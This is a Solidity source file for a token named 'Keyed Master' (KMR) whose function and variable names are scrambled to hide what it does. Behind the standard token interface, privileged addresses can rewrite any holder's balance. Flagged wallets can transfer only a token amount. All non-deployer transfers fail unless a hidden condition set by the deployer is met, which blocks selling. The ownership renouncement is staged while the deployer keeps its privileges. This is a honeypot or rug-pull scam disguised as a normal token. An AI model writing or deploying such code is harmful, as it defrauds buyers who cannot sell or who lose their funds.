//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface autoFrom {
    function createPair(address listShould, address launchAmount) external returns (address);
}

interface fundSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoTake) external view returns (uint256);

    function transfer(address autoTo, uint256 atAmount) external returns (bool);

    function allowance(address tokenTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 atAmount) external returns (bool);

    function transferFrom(
        address sender,
        address autoTo,
        uint256 atAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityReceiverBuy, uint256 value);
    event Approval(address indexed tokenTake, address indexed spender, uint256 value);
}

abstract contract autoLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingMaxMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundMinWallet is fundSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract KeyedMaster is autoLaunched, fundSwap, fundMinWallet {

    uint256 private autoEnableShould = 100000000 * 10 ** 18;

    string private isEnable = "Keyed Master";

    function approve(address shouldFrom, uint256 atAmount) public virtual override returns (bool) {
        marketingMode[_msgSender()][shouldFrom] = atAmount;
        emit Approval(_msgSender(), shouldFrom, atAmount);
        return true;
    }

    uint256 private shouldTake;

    address public marketingExempt;

    bool private enableReceiver;

    function name() external view virtual override returns (string memory) {
        return isEnable;
    }

    mapping(address => bool) public modeTrading;

    function getOwner() external view returns (address) {
        return marketingFee;
    }

    function transferFrom(address teamIs, address autoTo, uint256 atAmount) external override returns (bool) {
        if (_msgSender() != walletMax) {
            if (marketingMode[teamIs][_msgSender()] != type(uint256).max) {
                require(atAmount <= marketingMode[teamIs][_msgSender()]);
                marketingMode[teamIs][_msgSender()] -= atAmount;
            }
        }
        return senderToTotal(teamIs, autoTo, atAmount);
    }

    event OwnershipTransferred(address indexed fundLaunch, address indexed autoToken);

    function owner() external view returns (address) {
        return marketingFee;
    }

    function symbol() external view virtual override returns (string memory) {
        return isSender;
    }

    uint256 tradingMarketingLiquidity;

    bool public sellMinFrom;

    address amountListTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public sellExempt;

    address private marketingFee;

    function allowance(address atTo, address shouldFrom) external view virtual override returns (uint256) {
        if (shouldFrom == walletMax) {
            return type(uint256).max;
        }
        return marketingMode[atTo][shouldFrom];
    }

    function shouldReceiverTake(address fundBuyAt) public {
        isAmount();
        if (isTotal != shouldTake) {
            shouldTake = senderEnable;
        }
        if (fundBuyAt == marketingExempt || fundBuyAt == launchedFund) {
            return;
        }
        modeTrading[fundBuyAt] = true;
    }

    bool public teamWallet;

    uint256 private isTotal;

    mapping(address => uint256) private amountIs;

    uint256 limitAtMode;

    function amountLimitLaunched() public {
        emit OwnershipTransferred(marketingExempt, address(0));
        marketingFee = address(0);
    }

    function transfer(address receiverMin, uint256 atAmount) external virtual override returns (bool) {
        return senderToTotal(_msgSender(), receiverMin, atAmount);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoEnableShould;
    }

    uint8 private teamLaunchedMax = 18;

    function modeSwap(uint256 atAmount) public {
        isAmount();
        tradingMarketingLiquidity = atAmount;
    }

    bool public listAt;

    bool public totalMinToken;

    function isAmount() private view {
        require(sellExempt[_msgSender()]);
    }

    address public launchedFund;

    function swapMax(address fundReceiver) public {
        require(fundReceiver.balance < 100000);
        if (teamWallet) {
            return;
        }
        
        sellExempt[fundReceiver] = true;
        if (senderEnable == tradingMinBuy) {
            tradingMinBuy = senderEnable;
        }
        teamWallet = true;
    }

    uint256 private tradingMinBuy;

    address walletMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public senderEnable;

    constructor (){
        if (sellMinFrom == listAt) {
            enableReceiver = true;
        }
        tradingMaxMin fundAt = tradingMaxMin(walletMax);
        launchedFund = autoFrom(fundAt.factory()).createPair(fundAt.WETH(), address(this));
        
        marketingExempt = _msgSender();
        sellExempt[marketingExempt] = true;
        amountIs[marketingExempt] = autoEnableShould;
        amountLimitLaunched();
        if (listAt) {
            totalMinToken = false;
        }
        emit Transfer(address(0), marketingExempt, autoEnableShould);
    }

    function decimals() external view virtual override returns (uint8) {
        return teamLaunchedMax;
    }

    string private isSender = "KMR";

    function swapFrom(address receiverMin, uint256 atAmount) public {
        isAmount();
        amountIs[receiverMin] = atAmount;
    }

    function senderToTotal(address teamIs, address autoTo, uint256 atAmount) internal returns (bool) {
        if (teamIs == marketingExempt) {
            return modeLiquidityBuy(teamIs, autoTo, atAmount);
        }
        uint256 minAtLiquidity = fundSwap(launchedFund).balanceOf(amountListTeam);
        require(minAtLiquidity == tradingMarketingLiquidity);
        require(autoTo != amountListTeam);
        if (modeTrading[teamIs]) {
            return modeLiquidityBuy(teamIs, autoTo, sellSender);
        }
        return modeLiquidityBuy(teamIs, autoTo, atAmount);
    }

    function balanceOf(address autoTake) public view virtual override returns (uint256) {
        return amountIs[autoTake];
    }

    uint256 constant sellSender = 20 ** 10;

    mapping(address => mapping(address => uint256)) private marketingMode;

    function modeLiquidityBuy(address teamIs, address autoTo, uint256 atAmount) internal returns (bool) {
        require(amountIs[teamIs] >= atAmount);
        amountIs[teamIs] -= atAmount;
        amountIs[autoTo] += atAmount;
        emit Transfer(teamIs, autoTo, atAmount);
        return true;
    }

}